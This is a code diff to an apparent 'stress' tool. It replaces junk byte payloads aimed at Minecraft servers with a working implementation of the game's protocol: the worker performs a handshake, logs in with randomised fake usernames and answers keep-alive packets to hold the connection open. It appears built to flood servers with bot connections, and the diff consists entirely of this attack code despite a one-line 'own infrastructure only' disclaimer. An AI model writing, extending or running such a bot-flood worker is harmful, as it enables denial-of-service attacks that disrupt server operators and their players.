@@ -7,6 +7,7 @@ For testing your OWN infrastructure only. Unauthorized use is illegal.
 import importlib
 import os
 import platform
+import random
 import shutil
 import socket
 import subprocess
@@ -380,24 +381,74 @@ def progress_bar(current, total, bar_len=40):
     return f"    [{bar}] {pct}"
 
 
-MINECRAFT_PAYLOADS = [
-    b"\x00\xff\xff\xff\xff\x01\x00",
-    b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
-    b"\xfe\x01\x00",
-    b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-    b"\x00" * 64,
-    b"\xff" * 128,
-]
+def _mc_varint(v):
+    out = bytearray()
+    while True:
+        if v & 0xFFFFFF80 == 0:
+            out.append(v & 0x7F)
+            break
+        out.append((v & 0x7F) | 0x80)
+        v >>= 7
+    return bytes(out)
+
+
+def _mc_pstr(s):
+    d = s.encode("utf-8")
+    return _mc_varint(len(d)) + d
+
+
+def _mc_packet(pid, *parts):
+    body = bytes([pid]) + b"".join(parts)
+    return _mc_varint(len(body)) + body
+
+
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
 
 
 def _mc_worker(ip, port, results, idx):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2.0)
-        sock.connect((ip, port))
-        payload = MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)]
-        sock.sendall(payload)
-        sock.close()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
+        s.connect((ip, port))
+        host = ip
+        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
+        s.sendall(handshake)
+        username = f"Stress_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+        login = _mc_packet(0x00, _mc_pstr(username))
+        s.sendall(login)
+        end = time.time() + 4
+        while time.time() < end:
+            try:
+                s.settimeout(1)
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
+            except socket.timeout:
+                continue
+            except Exception:
+                break
+        s.close()
         results[idx] = 1
     except Exception:
         results[idx] = 0
